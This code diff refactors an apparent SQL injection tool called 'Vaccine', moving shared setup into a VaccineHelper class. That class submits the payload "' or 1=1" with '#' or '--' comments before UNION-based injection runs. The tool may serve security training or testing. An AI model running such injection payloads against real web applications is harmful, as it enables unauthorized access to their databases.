@@ -66,20 +66,28 @@ def get_result(str1, str2, query=""):
 		result = result.replace(query, "[query]")
 	return result[:500]
 
+class VaccineHelper:
+	def __init__(self, submit, comment):
+		self.submit = submit
+		self.delimiter = "'"
+		self.comment = comment
+		self.original_text = self.submit("").text
+		self.normal_text = self.submit("' or 1=1" + self.comment).text
+
 class Union:
 	class UnionException(Exception):
 		pass
 
-	def __init__(self, submit, comment, get_input):
-		print(f"{Style.GREEN}< UNION comment:{comment} >{Style.RESET}")
+	def __init__(self, submit, helper, get_input):
+		print(f"{Style.GREEN}< UNION comment:{helper.comment} >{Style.RESET}")
 		self.submit = submit
-		self.delimiter = "'"
+		self.delimiter = helper.delimiter
 		self.header = self.delimiter + " UNION "
-		self.comment = comment
+		self.comment = helper.comment
 		self.get_input = get_input
 
-		self.original_text = self.submit("").text
-		self.normal_text = self.submit("' or 1=1" + self.comment).text
+		self.original_text = helper.original_text
+		self.normal_text = helper.normal_text
 		self.column_counts = self.check_num_colums()
 
 		self.mysql = True
@@ -305,16 +313,17 @@ class Vaccine:
 		return res
 
 	def vaccine(self):
-		self.submit("admin", "aaa")
 		try:
-			u = Union(self.submit, "#", self.get_input)
+			v = VaccineHelper(self.submit, "#")
+			u = Union(self.submit, v, self.get_input)
 			u.union()
 		except Union.UnionException as e:
 			error_continue(e)
 		except Exception as e:
 			error_exit(e)
 		try:
-			u2 = Union(self.submit, "--", self.get_input)
+			v = VaccineHelper(self.submit, "--")
+			u2 = Union(self.submit, v, self.get_input)
 			u2.union()
 		except Union.UnionException as e:
 			error_continue(e)
